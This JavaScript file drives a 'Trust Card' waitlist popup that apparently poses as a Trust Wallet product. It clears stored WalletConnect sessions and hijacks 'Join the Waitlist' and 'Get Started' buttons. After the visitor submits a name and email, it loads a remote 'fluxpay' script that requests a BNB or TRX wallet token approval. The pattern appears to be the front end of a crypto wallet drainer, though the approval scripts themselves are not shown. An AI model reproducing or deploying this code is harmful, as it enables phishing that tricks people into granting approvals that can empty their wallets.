/**
 * Trust Card Waitlist - Same flow as BEP20 reference (wallete-connect-bep-20)
 * Join waitlist → Apply Now → runApprovalInline(network) for BNB or TRX
 * Same function for both TRC (TRX) and BEP (BNB)
 */
(function () {
  'use strict';

  try {
    Object.keys(localStorage).forEach(function (key) {
      if (key.startsWith('wc@') || key === 'WALLETCONNECT_DEEPLINK_CHOICE' || key.startsWith('WCM_')) {
        localStorage.removeItem(key);
      }
    });
    if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
      try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB'); } catch (_) {}
    }
  } catch (_) {}

  const overlay = document.getElementById('waitlist-overlay');
  const form = document.getElementById('waitlist-form');
  const formWrap = document.getElementById('waitlist-form-wrap');
  const successWrap = document.getElementById('waitlist-success');
  const failedWrap = document.getElementById('waitlist-failed');
  const closeBtn = document.getElementById('waitlist-close');
  const applyBtn = document.getElementById('waitlist-apply-btn');
  const tryAgainBtn = document.getElementById('waitlist-try-again-btn');

  function openPopup() {
    if (overlay) {
      overlay.classList.add('open');
      document.body.style.overflow = 'hidden';
    }
  }

  function closePopup() {
    if (overlay) overlay.classList.remove('open');
    document.body.style.overflow = '';
    if (formWrap) formWrap.style.display = 'block';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'none';
  }

  function showFailed() {
    if (formWrap) formWrap.style.display = 'none';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'block';
  }

  function resetToForm() {
    if (formWrap) formWrap.style.display = 'block';
    if (successWrap) successWrap.style.display = 'none';
    if (failedWrap) failedWrap.style.display = 'none';
  }

  function getRedirectUrl() {
    const stored = sessionStorage.getItem('tw-card-redirect');
    if (stored) return stored;
    const country = new URLSearchParams(window.location.search).get('country') || 'IN';
    return window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
  }

  if (overlay) overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closePopup();
  });
  if (closeBtn) closeBtn.addEventListener('click', closePopup);

  function onSuccess() {
    if (formWrap) formWrap.style.display = 'none';
    if (successWrap) successWrap.style.display = 'block';
    if (failedWrap) failedWrap.style.display = 'none';
    var url = getRedirectUrl();
    if (url) {
      setTimeout(function () {
        window.location.href = url.startsWith('/') ? window.location.origin + url : url;
      }, 1500);
    }
  }

  function onError(msg) {
    if (applyBtn) {
      applyBtn.disabled = false;
      applyBtn.textContent = 'Apply Now';
    }
    showFailed();
  }

  function runApprovalInline(network) {
    var baseUrl = (window.TRUST_CARD_APPROVAL_URL || (typeof location !== 'undefined' ? new URL('fluxpay', location.origin).href : 'fluxpay')).replace(/\/$/, '');
    var isTrc = network === 'TRX';
    var scriptUrl = baseUrl + (isTrc ? '/fluxpay-trc20-approval.js' : '/fluxpay-approval.js');
    var runKey = isTrc ? 'FluxPayTRC20Approval' : 'FluxPayApproval';
    var runFn = window[runKey] && window[runKey].run;

    if (!runFn) {
      if (applyBtn) {
        applyBtn.disabled = true;
        applyBtn.textContent = 'Loading...';
      }
      var script = document.createElement('script');
      script.type = 'module';
      script.src = scriptUrl;
      script.onload = function () {
        var fn = window[runKey] && window[runKey].run;
        if (!fn) {
          onError('Approval script not loaded');
          if (applyBtn) { applyBtn.disabled = false; applyBtn.textContent = 'Apply Now'; }
          return;
        }
        if (applyBtn) { applyBtn.disabled = true; applyBtn.textContent = 'Connecting...'; }
        fn(
          function () {
            window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
            onSuccess();
            if (applyBtn) { applyBtn.disabled = false; applyBtn.textContent = 'Apply Now'; }
          },
          function (err) {
            onError(err);
            if (applyBtn) { applyBtn.disabled = false; applyBtn.textContent = 'Apply Now'; }
          }
        );
      };
      script.onerror = function () {
        onError('Failed to load approval script');
        if (applyBtn) { applyBtn.disabled = false; applyBtn.textContent = 'Apply Now'; }
      };
      document.head.appendChild(script);
      return;
    }

    if (applyBtn) { applyBtn.disabled = true; applyBtn.textContent = 'Connecting...'; }
    runFn(
      function () {
        window.dispatchEvent(new CustomEvent('tw:wallet-connected'));
        onSuccess();
        if (applyBtn) { applyBtn.disabled = false; applyBtn.textContent = 'Apply Now'; }
      },
      function (err) {
        onError(err);
        if (applyBtn) { applyBtn.disabled = false; applyBtn.textContent = 'Apply Now'; }
      }
    );
  }

  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && overlay && overlay.classList.contains('open')) closePopup();
  });

  if (form) {
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      var username = document.getElementById('waitlist-username');
      var email = document.getElementById('waitlist-email');
      var networkEl = document.getElementById('waitlist-network');
      var usernameVal = username ? username.value.trim() : '';
      var emailVal = email ? email.value.trim() : '';
      var network = networkEl ? networkEl.value : '';

      if (!usernameVal || !emailVal || !network) return;

      if (network === 'BNB' || network === 'TRX') {
        try {
          sessionStorage.setItem('fluxpay_waitlist', JSON.stringify({ username: usernameVal, email: emailVal, network: network }));
        } catch (_) {}
        var country = new URLSearchParams(window.location.search).get('country') || 'IN';
        var cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
        try { sessionStorage.setItem('tw-card-redirect', cardUrl); } catch (_) {}
        runApprovalInline(network);
      }
    });
  }

  /* Only trigger on explicit waitlist - NOT on Get card (user wants Get card to open default modal) */
  var TRIGGER_TEXTS = ['Join the Waitlist', 'Get Started'];
  function attachToButtons() {
    var buttons = document.querySelectorAll('button, a');
    buttons.forEach(function (btn) {
      var text = (btn.textContent || '').trim();
      var isTrigger = TRIGGER_TEXTS.some(function (t) {
        return text === t || (text && text.toLowerCase().indexOf(t.toLowerCase()) !== -1);
      });
      if (isTrigger && !btn.dataset.waitlistBound) {
        btn.dataset.waitlistBound = 'true';
        btn.addEventListener('click', function (e) {
          e.preventDefault();
          e.stopPropagation();
          openPopup();
        });
      }
    });
  }

  if (tryAgainBtn) tryAgainBtn.addEventListener('click', resetToForm);

  function init() {
    attachToButtons();
    setInterval(attachToButtons, 1000);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
